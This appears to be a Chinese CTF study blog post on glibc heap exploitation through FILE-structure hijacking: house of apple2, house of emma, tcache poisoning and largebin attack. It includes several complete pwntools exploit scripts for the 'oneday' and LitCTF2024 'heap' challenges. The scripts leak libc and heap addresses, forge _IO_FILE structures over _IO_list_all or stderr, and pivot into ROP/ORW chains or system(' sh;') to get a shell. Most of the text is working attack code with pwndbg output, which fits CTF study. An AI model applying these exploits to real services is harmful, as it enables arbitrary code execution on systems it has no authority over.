// 需要走到这里 return EOF; // .....}当满足fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base时就会调用_IO_WOVERFLOW(fp)。例题分析onedayhouse of apple2解法前文有结构体内容，是利用_IO_wfile_overflow函数控制程序执行流exp:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232from pwn import *from ctypes import *pwn = './oneday'libc = ELF('./libc.so.6')if args['REMOTE']: io = remote('192.168.18.22', 8888)else: io = process(pwn)context(log_level='debug')#context.terminal = ['tmux','splitw','-h']context.binary = elf = ELF(pwn)rop = ROP(context.binary)s = lambda data: io.send(data)sa = lambda text, data: io.sendafter(text, data)sl = lambda data: io.sendline(data)sla = lambda text, data: io.sendlineafter(text, data)r = lambda num=4096: io.recv(num)ru = lambda text: io.recvuntil(text)pr = lambda num=4096: print(io.recv(num))inter = lambda: io.interactive()l32 = lambda: u32(io.recvuntil(b'\\xf7')[-4:].ljust(4, b'\\x00'))l64 = lambda: u64(io.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00'))uu32 = lambda: u32(io.recv(4).ljust(4, b'\\x00'))uu32_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(8), 16)uu64 = lambda: u64(io.recv(6).ljust(8, b'\\x00'))uu64_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(12), 16)uuu64 = lambda: u64(ru(b'\\x7f')[-6:].ljust(8, b'\\x00'))uuuu64 = lambda target: u64((ru(target)[-1:] + r(5)).ljust(8, b'\\x00'))int16 = lambda data: int(data, 16)lg = lambda s, num: io.success('%s -&gt; 0x%x' % (s, num))def get_sb(): return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\\x00'))def get_orw(): return libc_base + libc.sym['open'], libc_base + libc.sym['read'], libc_base + libc.sym['write']def debug(breakpoints=None): if breakpoints is None: breakpoints = [\"__call_tls_dtors\"] elif isinstance(breakpoints, str): breakpoints = [breakpoints] script = \"\" for bp in breakpoints: script += f\"b {bp}\\n\" gdb.attach(proc.pidof(io)[0], script) pause()def fmt(value, offset=14, size='hhn'): if size == 'hhn': num = value &amp; 0xff elif size == 'hn': num = value &amp; 0xffff elif size == 'n': num = value &amp; 0xffffffff payload = f\"%{num}c%{offset}${size}\".encode() #value 是格式化字符串偏移 return payloadlss = lambda s: log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))def cat_flag(): flag_header = b'flag{' sleep(1) sl('cat flag') ru(flag_header) flag = flag_header + ru('}') + b'}' exit(0)#asm(shellcraft.sh()).ljust(0x108,b'a')def set_key(key): sla(b'key &gt;&gt;\\n',str(key))def add(choise): sla(b'command:',b'1') sla(b'choise: ',str(choise))def dele(idx): sla(b'command: \\n',b'2') sla(b'Index: ',str(idx))def edit(idx,commend): sla(b'command:',b'3') sla(b'Index: ',str(idx)) sa(b'Message: \\n',commend)def show(idx): sla(b'command:',b'4') sla(b'Index: ',str(idx)) def exit(): sla(b'command:',b'6') set_key(10)add(2) #0add(2) #1add(1) #2dele(2)dele(1)dele(0)add(1) #3add(1) #4add(1) #5add(1) #6dele(3)dele(5)show(3)ru(b'Message: \\n')libc_base = uu64() - 0x1f2cc0lg(b'libc_base',libc_base)io.recv(2)heap_base = uu64() - 0x17f0lg(b'heap_base',heap_base)dele(4)dele(6)add(3) #7add(1) #8add(1) #9pause()dele(8)add(3)target_addr = libc_base + libc.sym['_IO_list_all'] lg(b'_IO_list_all',target_addr)_IO_wstrn_jumps = libc_base + libc.sym['_IO_wstrn_jumps']_IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']_IO_stdfile_1_lock = libc_base + 0x1f5720f1 = FileStructure()f1._IO_read_ptr = 0xa81f1.flags = p64(heap_base + 0x2000)f1._IO_save_base = p64(heap_base+0x1a00)f1._lock = _IO_stdfile_1_lockfake_IO_FILE = heap_base + 0x1810f1._wide_data = fake_IO_FILE + 0xe0f1.vtable = _IO_wfile_jumpssetcontext = libc_base + libc.sym['setcontext']pop_rdi = libc_base + 0x2daa2ret = pop_rdi+1pop_rax = libc_base + 0x446c0pop_rsi = libc_base + 0x37c0apop_rdx_rbx = libc_base + 0x87729 syscall = libc_base + 0x883b6magic_gadget = libc_base + 0x146020magic = libc_base + 0x1482BAlg(b'fake_IO_FILE',fake_IO_FILE)data = flat({ 0x8: target_addr - 0x20, 0x10:{ 0:{ 0:bytes(f1), 0xe0: { 0x18: 0, 0x30: 0, 0xe0: fake_IO_FILE + 0x200, 0x110:0x20, }, 0x200: { 0x0: heap_base + 0x1d00, 0x8: heap_base + 0x1a00, 0x10: setcontext + 61, 0x18: magic_gadget, 0x68: magic, 0x90: heap_base + 0x1d10, #rop链的入口 0x98: ret }, 0x300: { 0x0: 0, 0x8:heap_base+0x300, 0x10: 'flag\\x00\\x00\\x00\\x00', 0x20: setcontext+61 }, 0x500: [ pop_rax, 2, pop_rdi, heap_base + 0x1b20, pop_rsi, 0, syscall, pop_rax, 0, pop_rdi, 3, pop_rsi, heap_base + 0x500, pop_rdx_rbx, 0x40, 0, syscall, pop_rax, 1, pop_rdi, 1, pop_rsi, heap_base + 0x500, pop_rdx_rbx, 0x40, 0, syscall ] }, 0xa80:[0,0xab1] }})debug(\"call (void)signal(SIGALRM, SIG_IGN)\") edit(5,data)dele(2)add(3)exit()inter()LitCTF2024 heap2.35chunk无大小限制的uaf，所以tcache写_IO_list_all，打House of apple即可。网上有很多方法但是哥们学习了这两种直接拿shell的方法1: house of apple2+tcachebin attack123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173from pwn import *from ctypes import *pwn = './heap'libc = ELF('./libc.so.6')if args['REMOTE']: io = remote('192.168.18.22', 8888)else: io = process(pwn)context(log_level='debug')#context.terminal = ['tmux','splitw','-h']context.binary = elf = ELF(pwn)rop = ROP(context.binary)s = lambda data: io.send(data)sa = lambda text, data: io.sendafter(text, data)sl = lambda data: io.sendline(data)sla = lambda text, data: io.sendlineafter(text, data)r = lambda num=4096: io.recv(num)ru = lambda text: io.recvuntil(text)pr = lambda num=4096: print(io.recv(num))inter = lambda: io.interactive()l32 = lambda: u32(io.recvuntil(b'\\xf7')[-4:].ljust(4, b'\\x00'))l64 = lambda: u64(io.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00'))uu32 = lambda: u32(io.recv(4).ljust(4, b'\\x00'))uu32_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(8), 16)uu64 = lambda: u64(io.recv(6).ljust(8, b'\\x00'))uu64_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(12), 16)uuu64 = lambda: u64(ru(b'\\x7f')[-6:].ljust(8, b'\\x00'))uuuu64 = lambda target: u64((ru(target)[-1:] + r(5)).ljust(8, b'\\x00'))int16 = lambda data: int(data, 16)lg = lambda s, num: io.success('%s -&gt; 0x%x' % (s, num))def get_sb(): return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\\x00'))def get_orw(): return libc_base + libc.sym['open'], libc_base + libc.sym['read'], libc_base + libc.sym['write']def debug(breakpoints=None): if breakpoints is None: breakpoints = [\"__call_tls_dtors\"] elif isinstance(breakpoints, str): breakpoints = [breakpoints] script = \"\" for bp in breakpoints: script += f\"b {bp}\\n\" gdb.attach(proc.pidof(io)[0], script) pause()def fmt(value, offset=14, size='hhn'): if size == 'hhn': num = value &amp; 0xff elif size == 'hn': num = value &amp; 0xffff elif size == 'n': num = value &amp; 0xffffffff payload = f\"%{num}c%{offset}${size}\".encode() #value 是格式化字符串偏移 return payloadlss = lambda s: log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))def cat_flag(): flag_header = b'flag{' sleep(1) sl('cat flag') ru(flag_header) flag = flag_header + ru('}') + b'}' exit(0)#asm(shellcraft.sh()).ljust(0x108,b'a')def add(idx,size): sla(b'&gt;&gt;',b'1') sla(b'idx? ',str(idx).encode()) sla(b'size? ',str(size).encode())def dele(idx): sla(b'&gt;&gt;',b'2') sla(b'idx? ',str(idx).encode())def show(idx): sla(b'&gt;&gt;',b'3') sla(b'idx? ',str(idx).encode())def edit(idx,commend): sla(b'&gt;&gt;',b'4') sla(b'idx? ',str(idx).encode()) sa(b'content :',commend)def exit(): sla(b'&gt;&gt;',b'5')add(0,0x500)add(1,0x10)dele(0)show(0)ru(b'content : ')libc_base = uu64() - 0x21ace0main_arena = libc_base + 0x21ac80lg(b'libc_base',libc_base)lg(b'main_arena',main_arena)add(0xf,0x500)add(2,0x20)add(3,0x20)dele(2) #产生tcache bin0dele(3) #产生tcache bin1#可以得到 tcache bin1 -&gt; fd = tcache bin0show(2)ru(b'content : ')heap_base = u64(io.recv(5).ljust(8, b'\\x00')) &lt;&lt; 12lg(b'heap_base',heap_base)key = heap_base &gt;&gt; 12_IO_list_all = libc_base + libc.sym['_IO_list_all']debug()edit(3,p64(_IO_list_all ^ key))#修改后：可以得到 tcache bin1 -&gt; fd = (_IO_list_all ^ key)，经过malloc后返回的就是_IO_list_all的地址add(4,0x20) #申请的tcache bin1add(5,0x20) #申请的fake_chunk(_IO_list_all的位置)add(6,0x1000)add(7,0x1000)add(8,0x1000)fake_IO_1_addr = heap_base + 0x10 + 2080 #即是fake_IO_file的地址fake_IO_2_addr = heap_base + 0x10 + 6192 #即是pad3的地址fake_IO_3_addr = heap_base + 0x10 + 10304 #既是pad4的地址sys_addr = libc_base + libc.sym['system']_IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']fake_IO_file = b''fake_IO_file += b' sh;'.ljust(0x8,b'\\x00')+p64(0x1101)fake_IO_file = fake_IO_file.ljust(0x28,b'\\x00')fake_IO_file += p64(1) # _IO_write_ptrfake_IO_file = fake_IO_file.ljust(0xa0,b'\\x00')fake_IO_file += p64(fake_IO_2_addr) # _wide_data = fake_IO_2_addr fake_IO_file = fake_IO_file.ljust(0xd8,b'\\x00')fake_IO_file += p64(_IO_wfile_jumps) # vtable = IO_wfile_jumpsedit(6,fake_IO_file) pad3 = b''pad3 += p64(0) * 28pad3 += p64(fake_IO_3_addr) #vtableedit(7,pad3)pad4 = b''pad4 += p64(0) * 13pad4 += p64(sys_addr) #chainedit(8,pad4)edit(5,p64(fake_IO_1_addr)) #触发tcache poisoning，直接修改_IO_list_all的内容lg(b'fake_IO_1_addr',fake_IO_1_addr)lg(b'fake_IO_2_addr',fake_IO_2_addr)lg(b'fake_IO_3_addr',fake_IO_3_addr)pause()exit()inter()方法2：house of apple2+tcachebin attacktcache bin的fd指针修改修改前修改后由于我们修改了tcachebin1的fd指针，导致我们第二次申请的同样大小的堆块时，会直接申请的是返回_IO_2_1_stderr的地址，这导致我们可以直接修改__IO_2_1_stderr所在的内容，就可以触发tcache poisoning写入fake_IO_file结构体前：写入后：这里需要解释一下wide_data为什么存放的是stderr-0x40的地址，因为wide_data的地址加上0x68就是我们可以直接控制的rip的地址，可以执行onegadget，magic，system函数等等123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144from pwn import *from ctypes import *pwn = './heap'libc = ELF('./libc.so.6')if args['REMOTE']: io = remote('192.168.18.22', 8888)else: io = process(pwn)context(log_level='debug')#context.terminal = ['tmux','splitw','-h']context.binary = elf = ELF(pwn)rop = ROP(context.binary)s = lambda data: io.send(data)sa = lambda text, data: io.sendafter(text, data)sl = lambda data: io.sendline(data)sla = lambda text, data: io.sendlineafter(text, data)r = lambda num=4096: io.recv(num)ru = lambda text: io.recvuntil(text)pr = lambda num=4096: print(io.recv(num))inter = lambda: io.interactive()l32 = lambda: u32(io.recvuntil(b'\\xf7')[-4:].ljust(4, b'\\x00'))l64 = lambda: u64(io.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00'))uu32 = lambda: u32(io.recv(4).ljust(4, b'\\x00'))uu32_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(8), 16)uu64 = lambda: u64(io.recv(6).ljust(8, b'\\x00'))uu64_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(12), 16)uuu64 = lambda: u64(ru(b'\\x7f')[-6:].ljust(8, b'\\x00'))uuuu64 = lambda target: u64((ru(target)[-1:] + r(5)).ljust(8, b'\\x00'))int16 = lambda data: int(data, 16)lg = lambda s, num: io.success('%s -&gt; 0x%x' % (s, num))def get_sb(): return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\\x00'))def get_orw(): return libc_base + libc.sym['open'], libc_base + libc.sym['read'], libc_base + libc.sym['write']def debug(breakpoints=None): if breakpoints is None: breakpoints = [\"__call_tls_dtors\"] elif isinstance(breakpoints, str): breakpoints = [breakpoints] script = \"\" for bp in breakpoints: script += f\"b {bp}\\n\" gdb.attach(proc.pidof(io)[0], script) pause()def fmt(value, offset=14, size='hhn'): if size == 'hhn': num = value &amp; 0xff elif size == 'hn': num = value &amp; 0xffff elif size == 'n': num = value &amp; 0xffffffff payload = f\"%{num}c%{offset}${size}\".encode() #value 是格式化字符串偏移 return payloadlss = lambda s: log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))def cat_flag(): flag_header = b'flag{' sleep(1) sl('cat flag') ru(flag_header) flag = flag_header + ru('}') + b'}' exit(0)#asm(shellcraft.sh()).ljust(0x108,b'a')def add(idx,size): sla(b'&gt;&gt;',b'1') sla(b'idx? ',str(idx).encode()) sla(b'size? ',str(size).encode())def dele(idx): sla(b'&gt;&gt;',b'2') sla(b'idx? ',str(idx).encode())def show(idx): sla(b'&gt;&gt;',b'3') sla(b'idx? ',str(idx).encode())def edit(idx,commend): sla(b'&gt;&gt;',b'4') sla(b'idx? ',str(idx).encode()) sa(b'content :',commend)def exit(): sla(b'&gt;&gt;',b'5')add(0,0x100)dele(0)show(0)ru('content :')heap_base = (((u64(io.recv(6).ljust(8,b\"\\x00\")) &gt;&gt; 4)&lt;&lt;12)-0x2000)&gt;&gt;4log.success(f'heap_base:{heap_base:#x}')add(1,0x500)add(2,0x10)dele(1)show(1)ru(b'content : ')libc_base = uu64()-2206944log.success(f'libc_base:{libc_base:#x}')add(3,0x100)add(4,0x100)dele(3) #产生tcache bin0dele(4) #产生tcache bin1#tcache bin1 -&gt; fd = tcache bin0 stderr = libc_base + libc.sym['_IO_2_1_stderr_']sys_addr = libc_base + libc.sym['system']key = (heap_base + 0x3b0)&gt;&gt;12edit(4,p64(key^stderr)) #修改chunk4的fddebug()add(5,0x100) add(6,0x100)fake_file = flat({ 0x0: b\" sh;\", 0x28: sys_addr, 0xa0: stderr-0x40, # _wide_data 0xD8: libc_base + libc.sym['_IO_wfile_jumps'], # jumptable }, filler=b\"\\x00\")edit(6,fake_file)exit()inter()方法3: largebin attack+house of apple2自学的123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172from pwn import *from ctypes import *from pwncli import *pwn = './heap'libc = ELF('./libc.so.6')if args['REMOTE']: io = remote('192.168.18.22', 8888)else: io = process(pwn)context(log_level='debug')#context.terminal = ['tmux','splitw','-h']context.binary = elf = ELF(pwn)rop = ROP(context.binary)s = lambda data: io.send(data)sa = lambda text, data: io.sendafter(text, data)sl = lambda data: io.sendline(data)sla = lambda text, data: io.sendlineafter(text, data)r = lambda num=4096: io.recv(num)ru = lambda text: io.recvuntil(text)pr = lambda num=4096: print(io.recv(num))inter = lambda: io.interactive()l32 = lambda: u32(io.recvuntil(b'\\xf7')[-4:].ljust(4, b'\\x00'))l64 = lambda: u64(io.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00'))uu32 = lambda: u32(io.recv(4).ljust(4, b'\\x00'))uu32_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(8), 16)uu64 = lambda: u64(io.recv(6).ljust(8, b'\\x00'))uu64_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(12), 16)uuu64 = lambda: u64(ru(b'\\x7f')[-6:].ljust(8, b'\\x00'))uuuu64 = lambda target: u64((ru(target)[-1:] + r(5)).ljust(8, b'\\x00'))int16 = lambda data: int(data, 16)lg = lambda s, num: io.success('%s -&gt; 0x%x' % (s, num))def get_sb(): return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\\x00'))def get_orw(): return libc_base + libc.sym['open'], libc_base + libc.sym['read'], libc_base + libc.sym['write']def debug(breakpoints=None): if breakpoints is None: breakpoints = [\"__call_tls_dtors\"] elif isinstance(breakpoints, str): breakpoints = [breakpoints] script = \"\" for bp in breakpoints: script += f\"b {bp}\\n\" gdb.attach(proc.pidof(io)[0], script) pause()def fmt(value, offset=14, size='hhn'): if size == 'hhn': num = value &amp; 0xff elif size == 'hn': num = value &amp; 0xffff elif size == 'n': num = value &amp; 0xffffffff payload = f\"%{num}c%{offset}${size}\".encode() #value 是格式化字符串偏移 return payloadlss = lambda s: log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))def cat_flag(): flag_header = b'flag{' sleep(1) sl('cat flag') ru(flag_header) flag = flag_header + ru('}') + b'}' exit(0)#asm(shellcraft.sh()).ljust(0x108,b'a')def add(idx,size): sla(b'&gt;&gt;',b'1') sla(b'idx? ',str(idx).encode()) sla(b'size? ',str(size).encode())def dele(idx): sla(b'&gt;&gt;',b'2') sla(b'idx? ',str(idx).encode())def show(idx): sla(b'&gt;&gt;',b'3') sla(b'idx? ',str(idx).encode())def edit(idx,commend): sla(b'&gt;&gt;',b'4') sla(b'idx? ',str(idx).encode()) sa(b'content :',commend)def exit(): sla(b'&gt;&gt;',b'5')debug(\"_fini\")add(0,0x520)add(1,0x30)add(2,0x510)add(3,0x30)dele(0)show(0)ru(b'content : ')libc_base = uu64() - 96 - 0x21ac80lg(b'libc_base',libc_base)add(4,0x550)edit(0,b'a'*0x10)show(0)ru(b'a'*0x10)heap_base = u64(io.recv(6).ljust(8,b'\\x00')) - 0x290lg(b'heap_base',heap_base)large = libc_base + 0x21b0e0 //写topchunkheap = heap_base + 0x800 - 0x10_IO_wfile_jumps = libc_base + 0x2170c0_IO_list_all = libc_base + libc.sym['_IO_list_all']lg(b'_IO_all_list',_IO_list_all)sys_addr = libc_base + libc.sym['system']fake_IO_addr = heap_base + 0x800_lock = libc_base + 0x21ca60edit(0,p64(large)+p64(large)+p64(_IO_list_all-0x20)+p64(_IO_list_all-0x20)) dele(2)#pause()add(5,0x550)gadget1 = libc_base + 0x16a06a # mov rbp,QWORD PTR [rdi+0x48]# mov rax,QWORD PTR [rbp+0x18]# lea r13,[rbp+0x10]# mov DWORD PTR [rbp+0x10],0x0# mov rdi,r13# call QWORD PTR [rax+0x28]gadget2 = libc_base + 0x882cf#xor esi, esi ; mov rdi, rbp ; call qword ptr [r13 + 0x10]fake_IO_FILE = IO_FILE_plus_struct()# fake_IO_FILE.house_of_apple2_execmd_when_exit(_IO_list_all,_IO_wfile_jumps,sys_addr)fake_IO_FILE.vtable = p64(_IO_wfile_jumps)fake_IO_FILE._IO_save_base = p64(fake_IO_addr+0x260)fake_IO_FILE._mode = 0xfffffffffake_IO_FILE._lock = p64(_lock)fake_IO_FILE._wide_data = p64(fake_IO_addr+0x200)fake_IO_FILE._IO_write_ptr = p64(1)fake_IO_FILE._IO_write_base = p64(0)payload = bytes(fake_IO_FILE).ljust(0x200,b'\\x00') //之前卡在一个payload += p64(heap_base+0x2a0)payload = payload.ljust(0x260,b'\\x00')payload += b' sh;'payload = payload.ljust(0x270,b'\\x00')payload += p64(0)payload = payload.ljust(0x278,b'\\x00')payload += p64(fake_IO_addr+0x268)payload = payload.ljust(0x280,b'\\x00')payload += p64(sys_addr)payload = payload.ljust(0x290,b'\\x00')payload += p64(gadget2)payload = payload.ljust(0x2e0,b'\\x00')payload += p64(fake_IO_addr+0x300)payload = payload.ljust(0x368,b'\\x00')payload += p64(gadget1)edit(2,payload[0x10:])exit()inter()之前一直卡在这里没进去，服了，就是没修过rdp的值，导致[rbp+0x18]和[rdx+0x18]的值有冲突，一个必须为0，一个必须写数据，还好后面改了rbp就简单了，但是吧，还不够格，因为 mov DWORD PTR [rbp+0x10],0x0又清零参数，恶心的很，还好再找个gadget2把’ sh;’参数传给rdi，就简单了找gadget也是真的有意思，直接tele看不见，只有x/8i addr 这样才看得到gadget",
      "title_content": "heap的IO链学习 &lt;h2 id=\"house-of-apple学习\"&gt;house of apple学习&lt;/h2&gt;该题目大佬利用了house of emma和house of apple的组合攻击，最终实现了orw读取flag，在这里主要困难的点在于这里的edit也就修改chunk中的步骤只能一次，所以没办法直接利用house of emma（因为house of emma需要两次large bin attack，首先攻击pointer_guard将其修改为已知内容，第二攻击是攻击_IO_list_all，将其进行挟持到堆上，这样就可以控制FIFE的结构，实现最终的攻击效果），因此由于本题只能一次修改，没办法构成两次写，所以想到利用house of apple 可以实现pointer_guard进行覆盖为一个已知的值，这样在利用chain的值指向之后伪造的第二个file结构，对于这个结构可以实现house of emma的攻击方式，最终实现orw攻击查io链fpchainhouse of applehouse of apple的攻击原理，简单来说就是利用了_IO_wstrn_overflow这个函数，通过利用file的结构，这个函数可以覆盖传入fp-&gt;_wide_data上的地址覆盖为可以知道的堆地址，攻击效果和进行一次large bin attack一样，实现任意地址写已知地址。1234exit()/fcloseall() -&gt; _IO_cleanup() -&gt; _IO_flush_all_lockp() -&gt; 对 _IO_list_all 链表里每个 FILE 调用 vtable-&gt;_overflow（或其它 vtable 函数）_IO_FILE_plus结构体偏移1234567891011121314151617181920212223242526272829303132amd64： 0x0:'_flags',0x8:'_IO_read_ptr',0x10:'_IO_read_end',0x18:'_IO_read_base',0x20:'_IO_write_base',0x28:'_IO_write_ptr',0x30:'_IO_write_end',0x38:'_IO_buf_base',0x40:'_IO_buf_end',0x48:'_IO_save_base',0x50:'_IO_backup_base',0x58:'_IO_save_end',0x60:'_markers',0x68:'_chain',0x70:'_fileno',0x74:'_flags2',0x78:'_old_offset',0x80:'_cur_column',0x82:'_vtable_offset',0x83:'_shortbuf',0x88:'_lock',0x90:'_offset',0x98:'_codecvt',0xa0:'_wide_data',0xa8:'_freeres_list',0xb0:'_freeres_buf',0xb8:'__pad5',0xc0:'_mode',0xc4:'_unused2',0xd8:'vtable'首先上_IO_list_all的函数0x7ca9cdff3660 是全局变量 __GI__IO_list_all 的地址（也就是存指针的地方）0x7ca9cdff3680 是实际的 FILE 对象（_IO_2_1_stderr_）所在地址原结构体：123456789101112131415161718192021222324252627282930313233343536pwndbg&gt; p *(struct _IO_FILE_plus*) 0x7ca9cdff3680$3 = { file = { _flags = -72540025, _IO_read_ptr = 0x7ca9cdff3703 &lt;_IO_2_1_stderr_+131&gt; \"\", _IO_read_end = 0x7ca9cdff3703 &lt;_IO_2_1_stderr_+131&gt; \"\", _IO_read_base = 0x7ca9cdff3703 &lt;_IO_2_1_stderr_+131&gt; \"\", _IO_write_base = 0x7ca9cdff3703 &lt;_IO_2_1_stderr_+131&gt; \"\", _IO_write_ptr = 0x7ca9cdff3703 &lt;_IO_2_1_stderr_+131&gt; \"\", _IO_write_end = 0x7ca9cdff3703 &lt;_IO_2_1_stderr_+131&gt; \"\", _IO_buf_base = 0x7ca9cdff3703 &lt;_IO_2_1_stderr_+131&gt; \"\", _IO_buf_end = 0x7ca9cdff3704 &lt;_IO_2_1_stderr_+132&gt; \"\", _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x7ca9cdff3760 &lt;_IO_2_1_stdout_&gt;, _fileno = 2, _flags2 = 0, _old_offset = -1, _cur_column = 0, _vtable_offset = 0 '\\000', _shortbuf = \"\", _lock = 0x7ca9cdff5720 &lt;_IO_stdfile_2_lock&gt;, _offset = -1, _codecvt = 0x0, _wide_data = 0x7ca9cdff2880 &lt;_IO_wide_data_2&gt;, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = 0, _unused2 = '\\000' &lt;repeats 19 times&gt; }, vtable = 0x7ca9cdff4560 &lt;__GI__IO_file_jumps&gt;}修改后：fake_IO_FILE_plus（house of apple2）:1234567891011121314151617181920212223242526272829303132333435pwndbg&gt; p *(struct _IO_FILE_plus*) 0x599c8d7a9810$20 = { file = { _flags = -1921343488, _IO_read_ptr = 0xa81 &lt;error: Cannot access memory at address 0xa81&gt;, _IO_read_end = 0x7ca9cdff3250 &lt;main_arena+1520&gt; \"@2\\377ͩ|\", _IO_read_base = 0x599c8d7a97e0 \"\", _IO_write_base = 0x599c8d7a97e0 \"\", _IO_write_ptr = 0x7ca9cdff3640 &lt;_nl_global_locale+224&gt; \"\\255a\\373ͩ|\", _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x599c8d7a9a00 \" \", _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x0, _fileno = 0, _flags2 = 0, _old_offset = -1, _cur_column = 0, _vtable_offset = 0 '\\000', _shortbuf = \"\", _lock = 0x7ca9cdff5720 &lt;_IO_stdfile_2_lock&gt;, _offset = -1, _codecvt = 0x0, _wide_data = 0x599c8d7a98f0, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = 0, _unused2 = '\\000' &lt;repeats 19 times&gt; }, vtable = 0x7ca9cdff4020 &lt;__GI__IO_wfile_jumps&gt;}house of emma这里主要利用了在fflush(stderr)，这个函数会稳定的调用_IO_file_jumps中的sync，如果我们把这个指针伪造成之前提到的pcop的gadget也就是mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];我们就可以实现rdx，而且call对应的函数，这里一般为setcontext+61,但是这篇文章是将其call mprotect函数，这样就可以增加可执行权限，之后直接执行orw的shellcode就可以了，原理一样的程序主逻辑，具备增删改查功能，最小申请堆的大小为key*0x110，限定创建堆块的大小都是large bin中的add函数没有堆溢出，有申请三种方式，申请空间有key,key+0x10,2*key三种delete函数存在UAF漏洞edit函数只有一次写入机会show函数只有一次泄露的机会利用步骤1.利用一次write泄露出libc和heapbase2.构造一次largebin attack，修改_IO_list_all为一个堆地址3.利用house of apple修改pointer_guard的值为已知地址4.利用house of emma控制rsp5.执行orw读取flag堆风水的构造由于我们只能任意修改一次的chunk内容，所以如果我们想要进行large bin attack攻击形成任意地址写一个堆地址，又在这个堆地址内完成对于fake file的构造，就需要我们完成以下的chunk构造，借用roderick01师傅的图。只有只有我们才能在伪造bk_nextsize的同时修改size为并且伪造fakechunk实现house of apple和house of emma的攻击。关于这个堆风水的布局，我之前一直很疑惑，为什么add(small),add(meidum),add(large)有这么多差别？？？后面学习了很多博主和gpt分析后，我大致理解了原理我们的目的就是构造三个chunk的布局12345chunk1 = heap_addr + 0x24chunk2 = heap_addr + 0x34chunk3 = heap_addr + 0x54如何构造的呢？首先我们可以分配的chunk的大小是key,key+0x10,2*key，然后依照大佬方式设置的key为0xa先设x = key+0x10,y = key +0x10+0x10,z = 2*key+0x10 ,我们可以得到一些关系，123452 * x = 2 * (0xa+0x10) = 0x342 * y = 2 * (0xa+0x20) = 0x54z = 2 * 0xa +0x20 = 0x24这意味着什么呢？就是我们分配2个small大小的堆，下个堆块指针指向的是chunk2的位置，分配2个meidum大小的堆块，下个堆块指向的是chunk3的位置，分配1个large大小的堆块，下个堆块指向的是chunk1的指针,然后由于后面删除的是unsortbin，导致和没分配一样的，就可以进行堆风水构造那么合理利用堆风水就可以构造出三个重叠的堆块:（从上至下顺序为：large+small,2small+small,2medium+small）继而可以修改堆块A的bk_nextsize指针并伪造一个堆块B，这样再进行largebin attack的时候就既可以任意地址写一个堆地址，也可以控制写的堆地址所在chunk的内容，从而构造fake file结构体。代码分析第一次堆风水，布置上面的大佬图中的chunk3（也就是代码里的2），两个meidum+small123456add(2) #0add(2) #1add(1) #2dele(2)dele(1)dele(0)第二次堆风水，布置大佬图中的chunk2（也就是代码里的5）,两个small+small123456add(1) #3add(1) #4add(1) #5add(1) #6dele(3)dele(5)释放堆块3和堆块5进入unsortbin，可以泄露的了libc基址和heap基址1234567891011121314add(1) #3add(1) #4add(1) #5add(1) #6dele(3)dele(5)show(3)ru(b'Message: \\n')libc_base = uu64() - 0x1f2cc0lg(b'libc_base',libc_base)io.recv(2)heap_base = uu64() - 0x17f0lg(b'heap_base',heap_base)关于TLS段的本地pointer_guard关于TLS段的本地pointer_guard怎么找，有个很恶心的点，就是在以前系统内核版本不高的时候，你可以用libc_base去直接得到pointer_guard的地址的，但是现在反正我无法像roderick01师傅一样，用他们打的时候的tls段就在libc基址前面一点，现在不行，已经调试过n遍，一直都会变的，和libc基址没关系了，pointer_guard的地址，与ld基地址偏移是固定的，而与libc基地址的偏移不固定。所以在本地调试过程中，需要关闭aslr，才能获得与libc基地址的固定偏移，当打远程的题目时，则需要爆破。方法1：fsbase+0x30（tls+0x30）方法2:第三次堆风水，布置大佬图中的chunk1（也就是代码里的8）1234567dele(4)dele(6)add(3) #7add(1) #8add(1) 